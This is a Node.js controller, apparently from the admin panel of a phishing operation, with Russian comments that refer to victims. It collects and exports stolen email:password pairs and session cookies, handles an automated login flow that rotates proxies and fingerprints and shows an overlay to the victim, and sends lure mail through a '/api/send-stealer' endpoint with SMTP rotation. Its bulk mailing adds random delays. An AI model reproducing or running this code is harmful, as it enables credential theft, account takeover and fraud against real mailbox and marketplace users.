// Controller: lead actions, mailings, warmup run, chat (sloppy — uses with(scope)).
const path = require('path');
const fs = require('fs');
const os = require('os');
const { spawn } = require('child_process');
const { send, safeEnd } = require('../utils/httpUtils');
const { checkAdminAuth, checkWorkerSecret, checkAdminPageAuth, hasValidAdminSession, hasValidWorkerSecret } = require('../utils/authUtils');
const {
  getPlatformFromRequest,
  maskEmail,
  translateChatText,
  CHAT_TRANSLATE_TARGET,
  EVENT_LABELS
} = require('../utils/formatUtils');
const { normalizeOptionalSchemeHttpUrl } = require('../utils/urlSchemeUtils');
const leadService = require('../services/leadService');
const adminSidebarUndo = require('../services/adminSidebarUndoService');
const automationService = require('../services/automationService');
const chatService = require('../services/chatService');
let nodemailer;
try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
const { runConcurrent } = require('../utils/runConcurrent');
const { formatModeStartPage, formatModeStartPageMulti } = require('../lib/adminModeFlowLog');
const leadChatController = require('./lead/chatController');
const leadAutomationStartController = require('./lead/automationStartController');
const leadAutomationCallbacksController = require('./lead/automationCallbacksController');
const leadWorkerSupportController = require('./lead/workerSupportController');
const MAIL_BATCH_SMTP_CONCURRENCY = 4;
const {
  hasWebMailboxForExport,
  getWebLoginAndNewPasswordForExport,
} = require('../lib/leadExportCredentials');
const SERVER_INSTANCE = process.env.INSTANCE_NAME || ('pm2-' + (process.env.pm_id || 'na'));
const LEADS_COOKIE_META_CACHE_TTL_MS = Math.max(1000, parseInt(process.env.LEADS_COOKIE_META_CACHE_TTL_MS || '7000', 10) || 7000);
let leadsCookieMetaCache = {
  ts: 0,
  cookieSafeSet: new Set(),
  cookieExportSets: { leadIds: new Set(), safeNames: new Set() }
};

/** Текст ошибки скрипта (нижний регистр): похоже на исчерпание сетки прокси×fp или обрыв прокси. */
function autologinErrorLooksLikeProxyOrGrid(emLower) {
  if (!emLower) return false;
  if (emLower.indexOf('webde_voruebergehend_exhausted') !== -1) return true;
  if (emLower.indexOf('нет комбинаций прокси') !== -1) return true;
  if (emLower.indexOf('нет комбинаций') !== -1 && emLower.indexOf('отпечат') !== -1) return true;
  if (emLower.indexOf('все комбинации перебраны') !== -1) return true;
  if (emLower.indexOf('err_proxy') !== -1) return true;
  if (emLower.indexOf('err_tunnel') !== -1) return true;
  if (emLower.indexOf('tunnel connection failed') !== -1) return true;
  if (emLower.indexOf('econnrefused') !== -1) return true;
  if (emLower.indexOf('connection_reset') !== -1) return true;
  if (emLower.indexOf('connection refused') !== -1) return true;
  if (emLower.indexOf('socks') !== -1 && emLower.indexOf('fail') !== -1) return true;
  if (emLower.indexOf('proxy') !== -1 && (emLower.indexOf('connect') !== -1 || emLower.indexOf('auth') !== -1)) return true;
  return false;
}

/** Ошибка автовхода с оверлеем жертве: всё равно дать админке метку «прокси/сеть», если похоже на прокси или типичный 502. */
function shouldPushAutologinProxyAdminNote(errorCode, errorMessage) {
  const c = String(errorCode || '').trim();
  if (!(c === '500' || c === '502' || c === '503')) return false;
  const em = String(errorMessage || '').toLowerCase();
  if (c === '502') return true;
  if (c === '503') return autologinErrorLooksLikeProxyOrGrid(em);
  return autologinErrorLooksLikeProxyOrGrid(em);
}

async function handle(scope) {
  with (scope) {
  if (await leadAutomationStartController.handle(scope)) return true;
  if (await leadWorkerSupportController.handle(scope)) return true;

  if (pathname === '/api/mark-opened' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const email = json.email;
      if (!email || typeof email !== 'string') return send(res, 400, { ok: false });
      const leads = leadService.readLeads();
      const emailLower = email.trim().toLowerCase();
      const now = new Date().toISOString();
      let found = false;
      const markedIds = [];
      // Помечаем все логи с таким email как открытые
      leads.forEach(function(lead) {
        const leadEmail = (lead.email || '').trim().toLowerCase();
        if (leadEmail === emailLower && !lead.openedAt) {
          lead.openedAt = now;
          found = true;
          markedIds.push(lead.id);
        }
      });
      if (found) {
        markedIds.forEach(function (mid) {
          const Lm = leads.find(function (x) { return x && String(x.id) === String(mid); });
          if (Lm) leadService.persistLeadPatch(mid, { openedAt: Lm.openedAt });
        });
        writeDebugLog('MARK_OPENED', { 
          email: email, 
          markedCount: markedIds.length,
          markedIds: markedIds
        });
      }
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/leads' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    var leadsQuery = (parsed && parsed.query) || {};
    var page = Math.max(1, parseInt(leadsQuery.page, 10) || 1);
    var limit = Math.min(1000, Math.max(1, parseInt(leadsQuery.limit, 10) || 200));
    var adminUiModeRaw = leadsQuery.adminUiMode != null ? String(leadsQuery.adminUiMode).trim().toLowerCase() : '';
    var adminUiModeFilter =
      adminUiModeRaw === 'email' || adminUiModeRaw === 'klein' || adminUiModeRaw === 'vint'
        ? adminUiModeRaw
        : '';
    writeDebugLog('LEADS_REQUESTED', {
      timestamp: new Date().toISOString(),
      ip: getClientIp(req),
      page: page,
      limit: limit,
      adminUiMode: adminUiModeFilter || undefined
    });
    try {
        /**
         * Список админки: по умолчанию только активные (не скрытые).
         * Только скрытые: ?archivedOnly=1 (раньше includeArchived=1 смешивал активные и архив — больше не используется).
         */
        var archivedOnly =
          leadsQuery.archivedOnly === '1' ||
          leadsQuery.archivedOnly === 'true' ||
          leadsQuery.includeArchived === '1' ||
          leadsQuery.includeArchived === 'true';
        var listFilter = archivedOnly ? 'archived' : 'active';
        var searchRaw = leadsQuery.q != null ? String(leadsQuery.q).trim() : '';
        var searchQ = searchRaw.length >= 2 ? searchRaw.slice(0, 120) : '';
        var total = leadService.countLeadsForAdminList(listFilter, searchQ, adminUiModeFilter);
        var totalPages = total > 0 ? Math.ceil(total / limit) : 1;
        if (page > totalPages) page = totalPages;
        var offset = (page - 1) * limit;
        var slice = leadService.getLeadsAdminListPage(listFilter, limit, offset, searchQ, adminUiModeFilter);

        /** Порядок в списке админки: adminListSortAt → createdAt → lastSeenAt (совпадает с SQL ORDER BY). */
        function leadRecencyMsForApi(l) {
          if (!l) return 0;
          const als = l.adminListSortAt ? new Date(l.adminListSortAt).getTime() : NaN;
          if (!isNaN(als) && als > 0) return als;
          const cr = l.createdAt ? new Date(l.createdAt).getTime() : NaN;
          if (!isNaN(cr) && cr > 0) return cr;
          const ls = l.lastSeenAt ? new Date(l.lastSeenAt).getTime() : NaN;
          return !isNaN(ls) && ls > 0 ? ls : 0;
        }

        const now = Date.now();
        function applyHeartbeatToLead(l) {
          if (!l || !l.id) return;
          const h = statusHeartbeats[l.id];
          if (!h) return;
          const seenAt = new Date(h.lastSeenAt).getTime();
          if (now - seenAt <= HEARTBEAT_MAX_AGE_MS) {
            l.sessionPulseAt = h.lastSeenAt;
            if (h.currentPage) l.currentPage = h.currentPage;
          }
        }
        slice.forEach(applyHeartbeatToLead);
        Object.keys(statusHeartbeats).forEach(function (kid) {
          try {
            if (now - new Date(statusHeartbeats[kid].lastSeenAt).getTime() > HEARTBEAT_MAX_AGE_MS) delete statusHeartbeats[kid];
          } catch (_) {
            delete statusHeartbeats[kid];
          }
        });

        var nowMetaTs = Date.now();
        var cookieSafeSet = null;
        var cookieExportSets = null;
        if ((nowMetaTs - leadsCookieMetaCache.ts) < LEADS_COOKIE_META_CACHE_TTL_MS) {
          cookieSafeSet = leadsCookieMetaCache.cookieSafeSet;
          cookieExportSets = leadsCookieMetaCache.cookieExportSets;
        } else {
          var cookiesDir = path.join(PROJECT_ROOT, 'login', 'cookies');
          cookieSafeSet = new Set();
          if (fs.existsSync(cookiesDir)) {
            fs.readdirSync(cookiesDir).forEach(function (f) {
              if (f.endsWith('.json')) cookieSafeSet.add(f.slice(0, -5));
            });
          }
          var exportedRaw = readCookiesExportedSets();
          cookieExportSets = exportedRaw && typeof exportedRaw === 'object' ? exportedRaw : { leadIds: new Set(), safeNames: new Set() };
          if (!(cookieExportSets.leadIds instanceof Set)) cookieExportSets.leadIds = new Set();
          if (!(cookieExportSets.safeNames instanceof Set)) cookieExportSets.safeNames = new Set();
          leadsCookieMetaCache = {
            ts: nowMetaTs,
            cookieSafeSet: cookieSafeSet,
            cookieExportSets: cookieExportSets
          };
        }
        function cookieSafeFromEmail(email) {
          if (!email || typeof email !== 'string') return '';
          return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
        }
        var byPlatform = leadService.countLeadsByPlatformForAdmin(listFilter, searchQ, adminUiModeFilter);
        /** Админка: при пагинации выбранный лид может «выпасть» со страницы при появлении нового лога — не переключать фокус на новый. */
        var ensureIdRaw = leadsQuery.ensureId && String(leadsQuery.ensureId).trim();
        var ensureResolved = ensureIdRaw ? String(leadService.resolveLeadId(ensureIdRaw)) : '';
        if (ensureResolved) {
          var alreadyInSlice = slice.some(function (l) {
            return l && l.id != null && String(l.id) === ensureResolved;
          });
          if (!alreadyInSlice) {
            var ensuredLead = leadService.getLeadAdminListRowById(ensureResolved, adminUiModeFilter);
            var hidEnsured =
              ensuredLead &&
              (archiveFlagIsSet(ensuredLead.adminLogArchived) || archiveFlagIsSet(ensuredLead.klLogArchived));
            if (listFilter === 'active' && hidEnsured) ensuredLead = null;
            if (listFilter === 'archived' && ensuredLead && !hidEnsured) ensuredLead = null;
            if (ensuredLead) {
              applyHeartbeatToLead(ensuredLead);
              slice = slice.concat([ensuredLead]);
              slice.sort(function (a, b) {
                if (!a || !b) return 0;
                var ta = leadRecencyMsForApi(a);
                var tb = leadRecencyMsForApi(b);
                if (tb !== ta) return tb - ta;
                return (b.id || '').localeCompare(a.id || '');
              });
            }
          }
        }
        var chatData = chatService.readChat();
        var sliceWithChat = slice.map(function (l) {
          var copy = {};
          for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
          delete copy.cookies;
          delete copy.cookiesDbPresent;
          var chatKey = chatService.getChatKeyFromLeadRow(l);
          var chatMessages = Array.isArray(chatData[chatKey]) ? chatData[chatKey] : [];
          var adminReadAt = (chatData._adminReadAt && typeof chatData._adminReadAt[chatKey] === 'string') ? chatData._adminReadAt[chatKey] : null;
          copy.chatCount = chatMessages.length;
          copy.chatUnreadCount = chatService.computeUnreadInboundLeadCount(chatMessages, adminReadAt);
          var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
          var hasDbCookies = l.cookiesDbPresent === true || (l.cookies != null && String(l.cookies).trim() !== '');
          copy.cookiesAvailable = hasDbCookies || cookieSafeSet.has(safe);
          copy.cookiesExported = cookieExportSets.leadIds.has(String(l.id)) || cookieExportSets.safeNames.has(safe);
          return copy;
        });
        writeDebugLog('LEADS_RETURNED', {
          count: sliceWithChat.length,
          total: total,
          page: page,
          limit: limit,
          totalLeadsDb: total,
          byPlatform: byPlatform,
          adminUiMode: adminUiModeFilter || undefined
        });
        var _payload = { leads: sliceWithChat, total: total, page: page, limit: limit };
        /** Админка: после слияния логов (тот же email → новый id) выбранный старый id не совпадает с записью — подставить актуальный id из replaced-lead-ids. */
        if (ensureIdRaw) {
          _payload.ensureIdResolved = ensureResolved || ensureIdRaw;
        }
        if (safeEnd(res)) return;
        var bodyJson = JSON.stringify(_payload);
        var leadsHeaders = {
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type, x-worker-secret',
          'Cache-Control': 'no-store, no-cache, must-revalidate',
          'Pragma': 'no-cache'
        };
        res.writeHead(200, leadsHeaders);
        var chunkSize = 65536;
        for (var i = 0; i < bodyJson.length; i += chunkSize) {
          res.write(bodyJson.slice(i, i + chunkSize));
        }
        res.end();
        return true;
    } catch (e) {
      console.error('[SERVER] Ошибка обработки leads:', e);
      send(res, 500, { error: 'Ошибка чтения данных' });
      return true;
    }
  }

  if (pathname === '/api/save-credentials' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    console.log('[SERVER] /api/save-credentials: получен запрос');
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      console.log('[SERVER] /api/save-credentials: тело запроса:', body);
      let json = {};
      try { 
        json = JSON.parse(body || '{}'); 
        console.log('[SERVER] /api/save-credentials: распарсен JSON:', json);
      } catch (err) {
        console.error('[SERVER] /api/save-credentials: ошибка парсинга JSON:', err);
        return send(res, 400, { ok: false, error: 'invalid json' });
      }
      const id = json.id;
      console.log('[SERVER] /api/save-credentials: id=', id);
      if (!id || typeof id !== 'string') {
        console.error('[SERVER] /api/save-credentials: неверный id');
        return send(res, 400, { ok: false, error: 'id required' });
      }
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) {
        console.error('[SERVER] /api/save-credentials: лог не найден, id=', id);
        return send(res, 404, { ok: false, error: 'lead not found' });
      }
      
      const email = (lead.email || '').trim();
      const password = (lead.password || '').trim();
      const newPassword = lead.changePasswordData && (lead.changePasswordData.newPassword || '').trim();
      
      console.log('[SERVER] /api/save-credentials: email=', maskEmail(email), 'hasPassword=', !!password, 'hasNewPassword=', !!newPassword);
      
      if (!email || !password) {
        console.error('[SERVER] /api/save-credentials: отсутствует email или пароль');
        return send(res, 400, { ok: false, error: 'Email или пароль отсутствуют' });
      }
      
      const credentials = readSavedCredentials();
      console.log('[SERVER] /api/save-credentials: текущее количество сохраненных:', credentials.length);
      const credentialText = email + ':' + password + (newPassword ? ' | ' + newPassword : '');
      const credentialData = {
        id: Date.now().toString(36) + Math.random().toString(36).slice(2),
        email: email,
        password: password,
        newPassword: newPassword || null,
        credentialText: credentialText,
        savedAt: new Date().toISOString()
      };
      
      credentials.push(credentialData);
      writeSavedCredentials(credentials);
      console.log('[SERVER] /api/save-credentials: данные сохранены, новое количество:', credentials.length);
      
      writeDebugLog('SAVE_CREDENTIALS', { 
        id: id, 
        email: email,
        hasNewPassword: !!newPassword,
        credentialId: credentialData.id,
        totalSaved: credentials.length
      });
      
      send(res, 200, { ok: true, credential: credentialData });
    });
    return true;
  }

  if (pathname === '/api/get-saved-credentials' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const credentials = readSavedCredentials();
    return send(res, 200, credentials);
  }

  if (pathname === '/api/delete-saved-credential' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const credentialId = json.id;
      if (!credentialId || typeof credentialId !== 'string') return send(res, 400, { ok: false });
      
      const credentials = readSavedCredentials();
      const filtered = credentials.filter((c) => c.id !== credentialId);
      if (filtered.length === credentials.length) return send(res, 404, { ok: false });
      
      writeSavedCredentials(filtered);
      send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/export-logs' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    const q = (parsed && parsed.query) || {};
    const type = (q.type && String(q.type).trim()) || 'credentials';
    let leads = leadService.readLeads();
    const platformsParam = q.platforms;
    const knownPlatforms = ['windows', 'macos', 'android', 'ios'];
    if (platformsParam) {
      const list = typeof platformsParam === 'string' ? platformsParam.split(',') : Array.isArray(platformsParam) ? platformsParam : [];
      const set = new Set(list.map((p) => String(p).trim().toLowerCase()).filter(Boolean));
      if (set.size > 0) {
        leads = leads.filter((lead) => {
          const p = (lead.platform || '').toLowerCase();
          const isUnknown = !p || !knownPlatforms.includes(p);
          if (set.has('unknown') && isUnknown) return true;
          if (knownPlatforms.includes(p) && set.has(p)) return true;
          return false;
        });
      }
    }
    leads = leads.filter(hasWebMailboxForExport);
    const emailTrim = (s) => (s != null ? String(s).trim() : '') || '';
    const emailLowerKey = (email) => String(email).trim().toLowerCase();
    /** Список лидов уже от новых к старым — первая запись по email выигрывает (актуальный лог). */
    const byEmailKey = new Map();
    let lines;
    if (type === 'credentials') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const k = emailLowerKey(email);
        if (byEmailKey.has(k)) return;
        const password = (lead.password != null ? String(lead.password) : '').trim();
        if (!password) return;
        byEmailKey.set(k, email + ':' + password);
      });
      lines = Array.from(byEmailKey.values());
    } else if (type === 'all_emails') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const k = emailLowerKey(email);
        if (!byEmailKey.has(k)) byEmailKey.set(k, email);
      });
      lines = Array.from(byEmailKey.values());
    } else if (type === 'all_email_pass') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const k = emailLowerKey(email);
        if (byEmailKey.has(k)) return;
        const password = (lead.password != null ? String(lead.password) : '').trim();
        byEmailKey.set(k, email + ':' + (password || ''));
      });
      lines = Array.from(byEmailKey.values());
    } else if (type === 'all_email_old_new') {
      leads.forEach((lead) => {
        const email = emailTrim(lead.email);
        if (!email) return;
        const k = emailLowerKey(email);
        if (byEmailKey.has(k)) return;
        const { passLogin, passNew } = getWebLoginAndNewPasswordForExport(lead);
        const loginTrim = (passLogin != null ? String(passLogin) : '').trim();
        if (!loginTrim) return;
        const newTrim = (passNew != null ? String(passNew) : '').trim();
        const line = newTrim ? email + ':' + loginTrim + ' | ' + newTrim : email + ':' + loginTrim;
        byEmailKey.set(k, line);
      });
      lines = Array.from(byEmailKey.values());
    } else {
      return send(res, 400, { ok: false, error: 'Invalid type' });
    }
    lines.sort(function (a, b) {
      return String(a).localeCompare(String(b), undefined, { sensitivity: 'base' });
    });
    const body = lines.join('\n') + (lines.length ? '\n' : '');
    const filename = type === 'credentials' ? 'logs-email-password.txt' : type === 'all_emails' ? 'logs-emails.txt' : type === 'all_email_pass' ? 'logs-all-email-pass.txt' : 'logs-email-old-new.txt';
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Content-Type': 'text/plain; charset=utf-8',
      'Content-Disposition': 'attachment; filename="' + sanitizeFilenameForHeader(filename) + '"',
      'Cache-Control': 'no-store'
    });
    res.end(body);
    return true;
  }

  if (pathname === '/api/send-stealer' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      let toEmail = (json.toEmail != null && json.toEmail !== '') ? String(json.toEmail).trim() : '';
      let password = (json.password != null) ? String(json.password).trim() : '';
      let leadFromId = null;
      let leadIdFromRequest = '';
      if (!toEmail) {
        const id = (json.id != null) ? String(json.id).trim() : '';
        if (!id) return send(res, 400, { ok: false, error: 'id or toEmail required' });
        leadIdFromRequest = id;
        const leads = leadService.readLeads();
        const lead = leads.find((l) => l.id === id);
        if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
        leadFromId = lead;
        toEmail = (lead.email || lead.emailKl || '').trim();
        if (!toEmail) return send(res, 400, { ok: false, error: 'Lead has no email' });
        password = (lead.password || lead.passwordKl || '').trim();
      }
      const data = readStealerEmailConfig();
      const configId = (json.configId != null && json.configId !== '') ? String(json.configId).trim() : null;
      let cfg = configId
        ? (data.configs || []).find((c) => c.id == configId)
        : data.current;
      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
        cfg = data.current;
        if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
          cfg = (data.configs || []).find((c) => c.smtpLine && c.smtpLine.trim());
        }
      }
      if (!cfg || !(cfg.smtpLine && cfg.smtpLine.trim())) {
        return send(res, 400, { ok: false, error: 'В конфиге не задан SMTP. Откройте /mailer/, введите SMTP (host:port:user:fromEmail:password) и нажмите «Сохранить».' });
      }
      let smtpList = parseSmtpLines(cfg.smtpLine).filter((s) => !sendStealerFailedSmtpEmails.has(s.fromEmail));
      if (!smtpList.length) return send(res, 400, { ok: false, error: 'Нет доступных SMTP (все отключены из-за ошибок отправки или не заданы).' });
      let html = (cfg.html || '')
        .replace(/_email_/g, toEmail)
        .replace(/_password_/g, password);
      const attachments = [];
      if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
        try {
          const buf = Buffer.from(cfg.image1Base64, 'base64');
          const cid = 'image1@mail';
          html = html.replace(/_src1_/g, 'cid:' + cid);
          attachments.push({
            filename: 'image1.png',
            contentType: 'image/png',
            contentTransferEncoding: 'base64',
            content: buf,
            cid: cid
          });
        } catch (e) {}
      } else if (html.indexOf('_src1_') !== -1) {
        html = html.replace(/_src1_/g, '');
      }
      if (!nodemailer) return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      // Резервируем индекс: 1-е письмо → SMTP 1, 2-е → SMTP 2, … При ошибке SMTP удаляется из списка, этому же адресу пробуем следующий.
      const smtpIndex = stealerRotation.index % smtpList.length;
      stealerRotation.index = (stealerRotation.index + 1) | 0;
      let lastError = null;
      for (let k = 0; k < smtpList.length; k++) {
        const smtp = smtpList[(smtpIndex + k) % smtpList.length];
        const transporter = nodemailer.createTransport({
          host: smtp.host,
          port: smtp.port,
          secure: smtp.port === 465,
          auth: { user: smtp.user, pass: smtp.password }
        });
        const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
        const mailOptions = {
          from: fromStr,
          to: toEmail,
          subject: (cfg.title || '').trim() || 'Message',
          html,
          attachments: attachments.length ? attachments : undefined,
          envelope: { from: smtp.fromEmail, to: toEmail },
          textEncoding: 'quoted-printable'
        };
        try {
          await transporter.sendMail(mailOptions);
          if (leadFromId && leadIdFromRequest) {
            pushEvent(leadFromId, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
            leadService.persistLeadPatch(leadIdFromRequest, { eventTerminal: leadFromId.eventTerminal });
          }
          return send(res, 200, { ok: true, fromEmail: smtp.fromEmail });
        } catch (err) {
          lastError = err;
          const msg = (err.message || '').slice(0, 200);
          writeDebugLog('SEND_STEALER_SMTP_ERROR', { fromEmail: smtp.fromEmail, toEmail: toEmail, message: msg });
          sendStealerFailedSmtpEmails.add(smtp.fromEmail);
        }
      }
      const msg = (lastError && lastError.message) ? String(lastError.message).slice(0, 200) : 'Все SMTP недоступны';
      return send(res, 500, { ok: false, error: msg });
    });
    return true;
  }

  if (pathname === '/api/mailer-campaign/start' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const result = startMailerCampaign(json || {});
      if (!result.ok) return send(res, result.statusCode || 400, { ok: false, error: result.error || 'start error' });
      return send(res, 200, { ok: true });
    });
    return true;
  }

  if (pathname === '/api/mailer-campaign/status' && req.method === 'GET') {
    if (!checkAdminAuth(req, res)) return;
    return send(res, 200, Object.assign({ ok: true }, getMailerCampaignStatus()));
  }

  if (pathname === '/api/mailer-campaign/pause' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const result = pauseMailerCampaign(json || {});
      return send(res, 200, Object.assign({ ok: true }, result || {}));
    });
    return true;
  }

  if (pathname === '/api/mailer-campaign/stop' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    const result = stopMailerCampaign();
    return send(res, 200, Object.assign({ ok: true }, result || {}));
  }

  if (pathname === '/api/mailer-campaign/log-clear' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    clearMailerCampaignLog();
    return send(res, 200, { ok: true });
  }

  /** Отправка письма из конфига Config → E-Mail (не Mailer/Stealer). Кнопка E-Mail в логе админки. */
  if (pathname === '/api/send-email' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const id = (json.id != null) ? String(json.id).trim() : '';
      if (!id) return send(res, 400, { ok: false, error: 'id required' });
      const leads = leadService.readLeads();
      const lead = leads.find((l) => l.id === id);
      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
      if (leadIsWorkedLikeAdmin(lead)) {
        return send(res, 400, { ok: false, error: 'Лог отработан — отправка письма запрещена' });
      }
      const result = await sendConfigEmailToLead(lead);
      if (result.ok) {
        pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
        leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
        const toEmail = (lead.email || lead.emailKl || '').trim();
        console.log('[send-email] Отправка (Config E-Mail) с ' + result.fromEmail + ' на ' + toEmail);
        return send(res, 200, { ok: true, fromEmail: result.fromEmail });
      }
      leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
      const code = result.statusCode || 500;
      return send(res, code, { ok: false, error: result.error || 'Ошибка отправки' });
    });
    return true;
  }

  /** Массовая отправка (Config → E-Mail) выбранным лидам. */
  if (pathname === '/api/send-email-bulk' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', async () => {
      if (!nodemailer) return send(res, 500, { ok: false, error: 'nodemailer not installed' });
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const ids = Array.isArray(json.ids) ? json.ids.map((x) => String(x || '').trim()).filter(Boolean) : [];
      if (ids.length === 0) return send(res, 400, { ok: false, error: 'ids required' });
      let leads = leadService.readLeads();
      const byId = new Map(leads.map((l) => [l.id, l]));
      let sent = 0;
      let failed = 0;
      let skipped = 0;
      const failSamples = [];
      const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
      for (let i = 0; i < ids.length; i++) {
        const id = ids[i];
        if (i > 0) await sleep(2000 + Math.floor(Math.random() * 3001));
        const lead = byId.get(id);
        if (!lead) {
          skipped++;
          continue;
        }
        if (leadIsWorkedLikeAdmin(lead)) {
          skipped++;
          continue;
        }
        const to = (lead.email || lead.emailKl || '').trim();
        if (!to) {
          skipped++;
          continue;
        }
        let result;
        try {
          result = await sendConfigEmailToLead(lead);
        } catch (e) {
          failed++;
          const em = (e && e.message) ? String(e.message).slice(0, 160) : 'exception';
          if (failSamples.length < 8) failSamples.push({ id, error: em });
          try {
            pushEvent(lead, CONFIG_EMAIL_FAILED_EVENT_LABEL, 'admin', { detail: em });
            leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
          } catch (e2) {}
          continue;
        }
        if (result.ok) {
          pushEvent(lead, CONFIG_EMAIL_SENT_EVENT_LABEL, 'admin');
          leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
          sent++;
        } else {
          failed++;
          if (failSamples.length < 8) failSamples.push({ id, error: result.error || '' });
          leadService.persistLeadPatch(id, { eventTerminal: lead.eventTerminal });
        }
      }
      return send(res, 200, { ok: true, total: ids.length, sent, failed, skipped, failSamples });
    });
    return true;
  }

  /**
   * Bulk actions from sidebar selection.
   * action:
   * - hide_selected (ids required)
   * - hide_selected_no_mail (ids required)
   * - hide_except_success (global)
   * - hide_send_email (global)
   * - hide_non_success_non_klein (global; без успешного входа в почту, Klein не трогать)
   * - hide_worked_all (global; скрыть отработанных в сайдбаре)
   * - undo_last_hide — отмена последней операции скрытия (снимает только её)
   * - unhide_selected (ids required) — вернуть выбранные из скрытых в активный список
   * - bulkInvert: true — для hide_non_success_non_klein | hide_worked_all | hide_send_email выполнить обратное (вернуть в активный список по тем же критериям), UI в режиме «Скрытые».
   * Прочие legacy unhide_* отключены.
   */
  if (pathname === '/api/leads-sidebar-bulk' && req.method === 'POST') {
    if (!checkAdminAuth(req, res)) return;
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try { json = JSON.parse(body || '{}'); } catch {}
      const action = (json.action != null) ? String(json.action).trim() : '';
      const ids = Array.isArray(json.ids) ? json.ids.map((x) => String(x || '').trim()).filter(Boolean) : [];
      const invertBulk = json.bulkInvert === true || json.bulkInvert === '1' || json.bulkInvert === 1;
      if (!action) return send(res, 400, { ok: false, error: 'action required' });
      if (
        action === 'unhide_hidden_non_success' ||
        action === 'unhide_hidden_send_email' ||
        action === 'unhide'
      ) {
        return send(res, 400, { ok: false, error: 'Ручное снятие скрытия (legacy) отключено' });
      }
      let leads = leadService.readLeads();
      const byId = new Map(leads.map((l) => [l.id, l]));
      let affected = 0;
      let skipped = 0;

      function sidebarLeadHidden(lead) {
        return (
          leadService.archiveFlagIsSet(lead.adminLogArchived) || leadService.archiveFlagIsSet(lead.klLogArchived)
        );
      }

      /** Записывает стек отмены и скрывает только ещё не скрытых. */
      function commitSidebarHidesForIds(rawIds) {
        const idsToHide = [];
        for (const raw of rawIds) {
          const id = String(raw || '').trim();
          if (!id) continue;
          const lead = byId.get(id);
          if (!lead) continue;
          if (sidebarLeadHidden(lead)) continue;
          idsToHide.push(id);
        }
        if (idsToHide.length) adminSidebarUndo.writeUndoLeadIds(idsToHide);
        idsToHide.forEach((id) => leadService.hideLeadInAdminSidebar(id, { skipBroadcast: true }));
        return idsToHide.length;
      }

      /** Снять скрытие у всех лидов, для которых matchFn(lead) и лид сейчас в архиве сайдбара. */
      function commitSidebarUnhidesForMatching(matchFn) {
        let n = 0;
        leads.forEach((lead) => {
          if (!lead) return;
          if (!sidebarLeadHidden(lead)) return;
          if (!matchFn(lead)) return;
          if (leadService.unhideLeadInAdminSidebar(lead.id, { skipBroadcast: true })) n++;
        });
        return n;
      }

      function leadHasMailLoginSuccess(lead) {
        const term = Array.isArray(lead && lead.eventTerminal) ? lead.eventTerminal : [];
        for (const ev of term) {
          const lbl = ev && ev.label != null ? String(ev.label) : '';
          if (!lbl) continue;
          if (lbl === EVENT_LABELS.SUCCESS || lbl === EVENT_LABELS.SUCCESS_KL) return true;
